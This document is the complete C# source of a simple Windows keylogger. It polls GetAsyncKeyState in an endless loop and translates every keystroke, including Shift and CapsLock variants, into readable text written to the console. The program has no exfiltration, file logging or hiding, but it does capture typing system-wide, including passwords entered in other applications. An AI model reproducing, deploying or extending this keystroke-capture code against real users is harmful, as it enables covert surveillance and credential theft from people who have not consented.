using System;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class Program
    {
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(int key);

        [DllImport("User32.dll")]
        public static extern int GetKeyState(int key);

        static void Main(string[] args)
        {
            bool isShiftPressed = false;

            while (true)
            {
                for (int key = 8; key < 223; key++)
                {
                    if (GetAsyncKeyState(key) == 32769)
                    {
                        if (GetKeyState(16) == 65408 || GetKeyState(16) == 65409)   //Shift
                        {
                            switch (key)
                            {
                                case 48: Console.Write(") "); break;
                                case 49: Console.Write("! "); break;
                                case 50: Console.Write("@ "); break;
                                case 51: Console.Write("# "); break;
                                case 52: Console.Write("$ "); break;
                                case 53: Console.Write("% "); break;
                                case 54: Console.Write("^ "); break;
                                case 55: Console.Write("& "); break;
                                case 56: Console.Write("* "); break;
                                case 57: Console.Write("( "); break;
                                case 160:
                                    if (!isShiftPressed)
                                    {
                                        Console.Write("leftShift ");
                                    }
                                    break;
                                case 161:
                                    if (!isShiftPressed)
                                    {
                                        Console.Write("rightShift ");
                                    }
                                    break;
                                case 186: Console.Write(": "); break;
                                case 187: Console.Write("+ "); break;
                                case 188: Console.Write("< "); break;
                                case 189: Console.Write("_ "); break;
                                case 190: Console.Write("> "); break;
                                case 191: Console.Write("? "); break;
                                case 192: Console.Write("~ "); break;
                                case 219: Console.Write("{ "); break;
                                case 220: Console.Write("| "); break;
                                case 221: Console.Write("} "); break;
                                case 222: Console.Write("\" "); break;
                                default:
                                    if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z'))
                                    {
                                        if (Console.CapsLock)
                                        {
                                            Console.Write((char)(key + 32) + " ");
                                        }
                                        else
                                        {
                                            Console.Write((char)key + " ");
                                        }
                                    }
                                    break;
                            }
                        }
                        else
                        {
                            isShiftPressed = false;
                            switch (key)
                            {
                                case 8: Console.Write("BackSpace "); break;
                                case 9: Console.Write("Tab "); break;
                                case 13: Console.Write("Enter "); break;
                                case 20: Console.Write("CapsLock "); break;
                                case 22: Console.Write("' "); break;
                                case 27: Console.Write("Escape "); break;
                                case 32: Console.Write("Space "); break;
                                case 37: Console.Write("pgLeft "); break;
                                case 38: Console.Write("pgUp "); break;
                                case 39: Console.Write("pgRight "); break;
                                case 40: Console.Write("pgDown "); break;
                                case 46: Console.Write("Delete "); break;                               
                                case 44: Console.Write("PrintScreen "); break;
                                case 45: Console.Write("Insert "); break;
                                case 91: Console.Write("leftWin "); break;
                                case 92: Console.Write("rightWin "); break;

                                case 96: Console.Write("0 "); break;
                                case 97: Console.Write("1 "); break;
                                case 98: Console.Write("2 "); break;
                                case 99: Console.Write("3 "); break;
                                case 100: Console.Write("4 "); break;
                                case 101: Console.Write("5 "); break;
                                case 102: Console.Write("6 "); break;
                                case 103: Console.Write("7 "); break;
                                case 104: Console.Write("8 "); break;
                                case 105: Console.Write("9 "); break;
                                case 106: Console.Write("* "); break;
                                case 107: Console.Write("+ "); break;
                                case 109: Console.Write("- "); break;
                                case 110: Console.Write(". "); break;
                                case 111: Console.Write("/ "); break;

                                case 144: Console.Write("NumLock "); break;
                                case 145: Console.Write("ScrollLock "); break;                               
                                case 162: Console.Write("leftCtrl "); break;
                                case 163: Console.Write("rightCtrl "); break;
                                case 164: Console.Write("leftAlt "); break;
                                case 165: Console.Write("rightAlt "); break;
                                case 186: Console.Write("; "); break;
                                case 187: Console.Write("= "); break;
                                case 188: Console.Write(", "); break;
                                case 189: Console.Write("- "); break;
                                case 190: Console.Write(". "); break;
                                case 191: Console.Write("/ "); break;
                                case 192: Console.Write("` "); break;
                                case 219: Console.Write("[ "); break;
                                case 220: Console.Write("\\ "); break;
                                case 221: Console.Write("] "); break;
                                case 222: Console.Write("' "); break;
                                default:
                                    if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9'))
                                    {
                                        if (Console.CapsLock || (key >= '0' && key <= '9'))
                                        {
                                            Console.Write((char)key + " ");
                                        }
                                        else
                                        {
                                            Console.Write((char)(key + 32) + " ");
                                        }
                                    }
                                    break;
                            }
                        }
                    }
                }
            }
        }
    }
}